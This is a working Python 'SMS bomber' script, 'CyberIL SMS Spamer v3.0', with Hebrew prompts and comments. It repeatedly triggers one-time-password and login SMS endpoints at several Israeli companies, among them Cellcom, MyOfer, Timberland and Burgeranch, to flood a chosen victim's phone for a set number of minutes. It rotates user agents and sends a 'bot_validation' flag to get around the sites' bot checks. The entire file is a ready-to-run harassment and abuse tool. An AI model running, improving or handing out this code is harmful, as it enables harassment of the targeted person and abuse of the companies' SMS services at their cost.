import requests
import asyncio
import random
import os
import sys
from datetime import datetime, timedelta

# ניסיון לייבא צבעים לעיצוב בטרמינל
try:
    from colorama import Fore, Style, init
    init()
    R = Fore.RED
    G = Fore.GREEN
    C = Fore.CYAN
    W = Fore.WHITE
    Y = Fore.YELLOW
    B = Style.BRIGHT
    RESET = Style.RESET_ALL # הוספתי את ההגדרה כאן
except ImportError:
    R = G = C = W = Y = B = RESET = "" # וגם כאן למקרה שאין colorama

# באנר פתיחה בעיצוב Cyber - הוספתי r לפני המירכאות כדי למנוע SyntaxWarning
BANNER = r"""
  _____       _               _____ _      
 / ____|     | |             |_   _| |     
| |    _   _ | |__   ___ _ __  | | | |     
| |   | | | || '_ \ / _ \ '__| | | | |     
| |___| |_| || |_) |  __/ |   _| |_| |____ 
 \_____\__, ||_.__/ \___|_|  |_____|______|
        __/ |                              
       |___/   SMS Spamer v3.0 | By Asaf
"""

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
]

def api_call(url, data=None, method="POST", is_json=True):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
        }
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=5)
        elif method == "PUT":
            r = requests.put(url, json=data, headers=headers, timeout=5)
        else:
            if is_json:
                r = requests.post(url, json=data, headers=headers, timeout=5)
            else:
                r = requests.post(url, data=data, headers=headers, timeout=5)
        return r.status_code in [200, 201, 204]
    except:
        return False

async def fire_round(phone):
    tasks = [
        # סלקום
        asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
        # MyOfer
        asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
        # אופנה
        asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        asyncio.to_thread(api_call, "https://www.aldoshoes.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        # אוכל וכללי
        asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, is_json=False),
        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
    ]
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r is True), len(tasks)

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{C}{B}{BANNER}{RESET}")
    
    target = input(f"{Y}[?] הכנס מספר טלפון יעד (05XXXXXXXX): {W}")
    if len(target) != 10 or not target.isdigit():
        print(f"{R}[!] מספר לא תקין.")
        return

    try:
        duration = int(input(f"{Y}[?] זמן הפעלה בדקות: {W}"))
    except:
        duration = 5

    end_time = datetime.now() + timedelta(minutes=duration)
    
    print(f"\n{G}[+] ההפצצה יצאה לדרך על {target}...")
    print(f"{C}[!] לחץ Ctrl+C לעצירה בכל שלב.\n")

    while datetime.now() < end_time:
        success, total = await fire_round(target)
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{W}[{timestamp}] {G}שוגרו בהצלחה: {success}/{total}")
        
        if datetime.now() < end_time:
            await asyncio.sleep(45)

    print(f"\n{C}[*] הסתיים! תודה שהשתמשת ב-CyberIL.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{R}[!] הפעולה הופסקה.")
